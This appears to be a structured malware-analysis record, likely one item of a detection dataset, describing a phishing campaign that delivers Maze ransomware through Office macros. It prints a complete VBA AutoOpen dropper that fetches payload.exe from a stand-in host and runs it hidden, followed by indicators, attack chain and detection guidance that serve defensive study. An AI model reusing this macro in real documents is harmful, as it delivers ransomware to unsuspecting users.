package_info.package_manager: N/A (delivered via email attachment, not a package manager)
package_info.why_malicious: The email campaign delivers weaponized Microsoft Office documents containing malicious macros that, when enabled by the user, download and execute the Maze ransomware, leading to data encryption and extortion.

execution_context.trigger: user opens document and enables macros
execution_context.file_location: malicious Office document (e.g., .doc, .xls) attached to phishing email

malicious_snippets.code_snippet:
Sub AutoOpen()
  Dim objXML As Object
  Set objXML = CreateObject("MSXML2.XMLHTTP")
  objXML.Open "GET", "http://malicious-domain.com/payload.exe", False
  objXML.Send
  If objXML.Status = 200 Then
    Dim objStream As Object
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Type = 1
    objStream.Open
    objStream.Write objXML.responseBody
    objStream.SaveToFile Environ("TEMP") & "\payload.exe", 2
    objStream.Close
    Shell Environ("TEMP") & "\payload.exe", vbHide
  End If
End Sub
malicious_snippets.code_behavior: When the user enables macros, the code downloads an executable from a remote server and saves it to the local TEMP directory, then executes it, resulting in ransomware infection.

malice_analysis.why_suspicious: Macros that download and execute binaries from the internet are a common malware delivery technique and are rarely used in legitimate documents.
malice_analysis.violated_expectations: Normal Office documents should not contain macros that fetch and run executables from external sources.
malice_analysis.similar_legitimate_use: Automated document processing in trusted internal environments may use macros, but never to download and execute arbitrary code from the internet.
key_indicators: AutoOpen macro triggers on document open
Use of MSXML2.XMLHTTP to download external payload
Saving and executing a file in the TEMP directory
No user notification or consent for code execution

attack_chain.action: User receives phishing email with malicious Office document attachment.
User opens the document and is prompted to enable macros.
Macro code downloads and executes Maze ransomware payload.
attack_chain.leads_to: System is infected with Maze ransomware.

attack_chain.action: Maze ransomware encrypts files and displays ransom note.

behavioral_signatures: Office documents with macros that download and execute binaries
Use of MSXML2.XMLHTTP or similar objects in VBA macros
Creation and execution of files in TEMP directory by Office processes
file_indicators: Presence of payload.exe or similar in TEMP directory
Unusual macro code in attachments from external sources
network_indicators: Outbound HTTP/HTTPS requests from Office processes to unknown domains
Connections to known Maze ransomware C2 infrastructure
detection_knowledge.how_to_detect: Monitor for Office documents with macros that attempt to download and execute files, especially those using AutoOpen or Document_Open triggers. Flag Office processes making outbound network connections or writing executables to disk. Use sandboxing to analyze attachments for suspicious macro behavior. Block or alert on known Maze ransomware C2 domains and IPs.
